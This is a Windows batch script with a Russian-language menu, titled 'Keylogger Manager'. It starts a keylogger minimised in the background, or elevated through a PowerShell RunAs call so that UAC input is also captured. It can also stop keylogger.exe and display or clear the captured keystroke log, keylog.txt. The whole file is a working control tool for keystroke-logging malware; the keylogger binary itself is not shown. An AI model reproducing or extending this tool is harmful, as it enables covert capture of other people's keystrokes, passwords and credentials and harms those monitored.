@echo off
chcp 65001 >nul
title Keylogger Manager
color 0F

:MENU
cls
echo ================================================
echo              KEYLOGGER MANAGER
echo ================================================
echo.
echo Текущие режимы работы:
echo [1] Запуск в режиме ОБЫЧНОГО ПОЛЬЗОВАТЕЛЯ
echo     (только обычный ввод, UAC НЕ перехватывается)
echo.
echo [2] Запуск в режиме АДМИНИСТРАТОРА
echo     (обычный ввод + UAC)
echo.
echo [3] Остановить все процессы
echo [4] Просмотр лога
echo [5] Очистить лог
echo [6] Выход
echo.
echo ================================================
echo.

choice /c 123456 /n /m "Выберите действие (1-6): "

if %errorlevel% equ 1 goto :RUN_USER
if %errorlevel% equ 2 goto :RUN_ADMIN
if %errorlevel% equ 3 goto :STOP
if %errorlevel% equ 4 goto :VIEW_LOG
if %errorlevel% equ 5 goto :CLEAR_LOG
if %errorlevel% equ 6 goto :EXIT

:RUN_USER
cls
echo ===== ЗАПУСК В РЕЖИМЕ ПОЛЬЗОВАТЕЛЯ =====
echo.
cd /d "%~dp0"
start /min run_keylogger.bat
echo Программа запущена в фоне
timeout /t 2 >nul
goto :MENU

:RUN_ADMIN
cls
echo ===== ЗАПУСК В РЕЖИМЕ АДМИНИСТРАТОРА =====
echo.
echo Запрос прав администратора...
powershell -Command "Start-Process '%~dp0run_keylogger.bat' -Verb RunAs"
echo.
echo Если UAC запрос был подтвержден - программа запущена
pause
goto :MENU

:STOP
cls
echo ===== ОСТАНОВКА ПРОГРАММЫ =====
echo.
taskkill /f /im keylogger.exe >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Программа остановлена
) else (
    echo [INFO] Программа не запущена
)
echo.
pause
goto :MENU

:VIEW_LOG
cls
echo ===== ПРОСМОТР ЛОГА =====
echo.
if exist "keylog.txt" (
    echo СОДЕРЖИМОЕ ФАЙЛА keylog.txt:
    echo ================================
    echo.
    type keylog.txt
    echo.
    echo ================================
) else (
    echo Лог файл не найден
)
echo.
pause
goto :MENU

:CLEAR_LOG
cls
echo ===== ОЧИСТКА ЛОГА =====
echo.
if exist "keylog.txt" (
    del keylog.txt
    echo === Keylogger Log === > keylog.txt
    echo Дата очистки: %date% %time% >> keylog.txt
    echo ==================== >> keylog.txt
    echo [OK] Лог очищен
) else (
    echo Лог файл не найден
)
echo.
pause
goto :MENU

:EXIT
exit /b 0